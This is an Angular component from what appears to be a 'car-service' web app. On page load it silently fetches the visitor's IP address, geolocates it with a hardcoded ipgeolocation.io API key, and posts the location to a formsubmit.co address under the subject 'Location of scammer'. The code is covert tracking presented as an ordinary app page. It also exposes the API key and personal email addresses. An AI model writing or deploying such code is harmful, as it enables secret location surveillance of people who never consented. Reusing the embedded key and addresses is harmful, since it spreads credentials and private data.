

import { HttpClient, HttpHeaders } from '@angular/common/http';
import { Component } from '@angular/core';
import { switchMap } from 'rxjs/operators';
@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  title = 'car-service';
  ipAddress:string;
  city:string;
  region: any;
  country: any;
  latLang: string;
  userIP: any;
  constructor(private http: HttpClient) {}


   ngOnInit() {
    this.http.get('https://jsonip.com').subscribe(
      (value:any) => {
        console.log(value);
        this.userIP = value.ip;
        this.getLocation(value.ip);
      },
      (error) => {
        console.log(error);
      }
    ); 
    console.log(this.userIP)

    
    }
getLocation(ip){
  let apiKey = "1734d44bcb354a908911b6d63c71bd79";
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

this.http.get(url).subscribe((res:any)=>{
  console.log("location",res);

        const email = {
          name:"Abhishek Giram",
          email:"abhishek.giram11@gmail.com",
          subject:"Location of scammer",
          message:JSON.stringify(res)
        };

        const headers = new HttpHeaders({ "Content-Type": "application/json" });
        this.http.post(
            "https://formsubmit.co/ukapplicationforabhishekgiram@gmail.com",
            { name: email.name, replyto: email.email, subject: email.subject, message: email.message},
            { headers: headers }
          )
          .subscribe(response => {
            console.log(response);
          }); 
       
})
}

}


